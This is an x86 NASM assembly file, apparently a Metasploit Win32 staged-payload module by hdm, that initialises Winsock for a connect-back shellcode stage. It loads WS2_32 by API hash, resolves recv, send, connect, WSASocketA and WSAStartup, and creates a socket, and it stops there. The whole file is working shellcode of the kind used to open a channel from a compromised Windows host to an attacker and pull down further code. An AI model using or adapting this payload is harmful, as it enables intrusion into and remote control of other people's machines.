;      Title:  Win32 Socket Initialization (connect)
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com



[BITS 32]

%include "win32_stage_api.asm"

sub esp, 0x100
push eax    ; [ebp + 12] = VirtualAlloc
push edi    ; [ebp +  8] = LoadLibraryA
push esi    ; [ebp +  4] = LGetProcAddress
push ebx    ; [ebp +  0] = kernel32.dll base
            
mov ebp, esp
call LLoadWinsock

%define FN_RECV     [ebp + 24]
%define FN_SEND     [ebp + 28]
%define FN_CONNECT  [ebp + 32]
%define FN_WSASOCK  [ebp + 36]
%define FN_WSASTART [ebp + 40]

LWSDataSegment:
;========================
dd 0x190      ; used by wsastartup
dd 0xe71819b6 ; recv        [ebp + 24]
dd 0xe97019a4 ; send        [ebp + 28]
dd 0x60aaf9ec ; connect     [ebp + 32]
dd 0xadf509d9 ; WSASocketA  [ebp + 36]
dd 0x3bfcedcb ; WSAStartup  [ebp + 40]
db "WS2_32", 0x00
;========================

LLoadWinsock:
    pop ebx             ; save address to data in ebx
    lea ecx, [ebx + 24] ; find address of "WS2_32.DLL"
    push ecx            ; push address of "WS2_32.DLL"
    call edi            ; call LoadLibraryA("WS2_32.DLL")     
    mov edi, ebx        ; store base of data section in edi
    mov ebx, eax        ; store base of winsock in ebx
    lea esi, [ebp + 20] ; store base of function table
    push byte 0x05      ; load five functions by hash
    pop ecx             ; configure the counter

Looper:    
    push ecx                    ; save the counter
    push ebx                    ; dll handle
    push dword [edi + ecx * 4]  ; function hash value
    call [ebp + 4]              ; find the address
    pop ecx                     ; restore the counter
    mov [esi + ecx * 4], eax    ; stack segment to store addresses
    loop Looper

LWSAStartup:                    ; WSAStartup (0x101, DATA)
    sub esp, [edi]
    push esp
    push dword [edi]
    call FN_WSASTART
    xor eax, eax
    
LWSASocketA:                    ; WSASocketA (2,1,0,0,0,0) 
    push eax
    push eax
    push eax
    push eax
    inc eax
    push eax
    inc eax
    push eax
    call FN_WSASOCK
    mov edi, eax
